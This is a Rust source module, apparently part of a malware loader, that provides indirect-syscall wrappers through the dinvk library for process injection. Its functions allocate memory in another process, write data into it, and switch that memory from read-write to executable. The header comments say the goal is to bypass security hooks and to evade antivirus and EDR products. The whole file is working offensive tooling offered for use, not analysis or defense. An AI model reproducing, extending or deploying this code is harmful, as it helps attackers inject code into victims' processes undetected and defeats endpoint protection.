//! Indirect Syscalls for the Loader using dinvk
//!
//! This module provides indirect syscalls for process injection,
//! using the dinvk library to bypass security hooks.
//!
//! Advantages:
//! - Bypasses hooks on VirtualAllocEx/WriteProcessMemory/VirtualProtectEx
//! - Dynamic syscall number resolution
//! - Compatible with multiple Windows versions
//! - Better AV/EDR evasion

#[cfg(target_os = "windows")]
use std::ffi::c_void;

#[cfg(target_os = "windows")]
use dinvk::winapis::{
    NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory, NT_SUCCESS,
};

/// Allocate memory in a remote process using indirect syscall
#[cfg(target_os = "windows")]
pub fn allocate_remote_memory(
    process_handle: *mut c_void,
    size: usize,
) -> Result<*mut c_void, String> {
    let mut base_address: *mut c_void = std::ptr::null_mut();
    let mut region_size = size;

    let status = NtAllocateVirtualMemory(
        process_handle,
        &mut base_address,
        0,
        &mut region_size,
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x04,   // PAGE_READWRITE (initially RW, will change to RX later)
    );

    if NT_SUCCESS(status) && !base_address.is_null() {
        Ok(base_address)
    } else {
        Err(format!("NtAllocateVirtualMemory failed: 0x{:X}", status))
    }
}

/// Write data to remote process memory using indirect syscall
#[cfg(target_os = "windows")]
pub fn write_remote_memory(
    process_handle: *mut c_void,
    base_address: *mut c_void,
    data: &[u8],
) -> Result<(), String> {
    let mut bytes_written: usize = 0;

    let status = NtWriteVirtualMemory(
        process_handle,
        base_address,
        data.as_ptr() as *mut c_void,
        data.len(),
        &mut bytes_written,
    );

    if NT_SUCCESS(status) {
        Ok(())
    } else {
        Err(format!("NtWriteVirtualMemory failed: 0x{:X}", status))
    }
}

/// Change memory protection in remote process using indirect syscall
#[cfg(target_os = "windows")]
pub fn protect_remote_memory(
    process_handle: *mut c_void,
    base_address: *mut c_void,
    size: usize,
) -> Result<(), String> {
    let mut base = base_address;
    let mut region_size = size;
    let mut old_protect: u32 = 0;

    let status = NtProtectVirtualMemory(
        process_handle,
        &mut base,
        &mut region_size,
        0x20, // PAGE_EXECUTE_READ
        &mut old_protect,
    );

    if NT_SUCCESS(status) {
        Ok(())
    } else {
        Err(format!("NtProtectVirtualMemory failed: 0x{:X}", status))
    }
}

// ============================================================================
// Local process memory operations (for fallback)
// ============================================================================

/// Allocate RW memory in current process using indirect syscall
#[cfg(target_os = "windows")]
pub fn allocate_local_rw_memory(size: usize) -> *mut c_void {
    use dinvk::winapis::NtCurrentProcess;

    let mut base_address: *mut c_void = std::ptr::null_mut();
    let mut region_size = size;

    let status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &mut base_address,
        0,
        &mut region_size,
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x04,   // PAGE_READWRITE
    );

    if NT_SUCCESS(status) {
        base_address
    } else {
        std::ptr::null_mut()
    }
}

/// Make local memory executable using indirect syscall
#[cfg(target_os = "windows")]
pub fn make_local_memory_executable(address: *mut c_void, size: usize) -> bool {
    use dinvk::winapis::NtCurrentProcess;

    let mut base = address;
    let mut region_size = size;
    let mut old_protect: u32 = 0;

    let status = NtProtectVirtualMemory(
        NtCurrentProcess(),
        &mut base,
        &mut region_size,
        0x20, // PAGE_EXECUTE_READ
        &mut old_protect,
    );

    NT_SUCCESS(status)
}

// ============================================================================
// Non-Windows stubs
// ============================================================================

#[cfg(not(target_os = "windows"))]
pub fn allocate_remote_memory(
    _process_handle: *mut std::ffi::c_void,
    _size: usize,
) -> Result<*mut std::ffi::c_void, String> {
    Err("Not supported on this platform".to_string())
}

#[cfg(not(target_os = "windows"))]
pub fn write_remote_memory(
    _process_handle: *mut std::ffi::c_void,
    _base_address: *mut std::ffi::c_void,
    _data: &[u8],
) -> Result<(), String> {
    Err("Not supported on this platform".to_string())
}

#[cfg(not(target_os = "windows"))]
pub fn protect_remote_memory(
    _process_handle: *mut std::ffi::c_void,
    _base_address: *mut std::ffi::c_void,
    _size: usize,
) -> Result<(), String> {
    Err("Not supported on this platform".to_string())
}

#[cfg(not(target_os = "windows"))]
pub fn allocate_local_rw_memory(_size: usize) -> *mut std::ffi::c_void {
    std::ptr::null_mut()
}

#[cfg(not(target_os = "windows"))]
pub fn make_local_memory_executable(_address: *mut std::ffi::c_void, _size: usize) -> bool {
    false
}
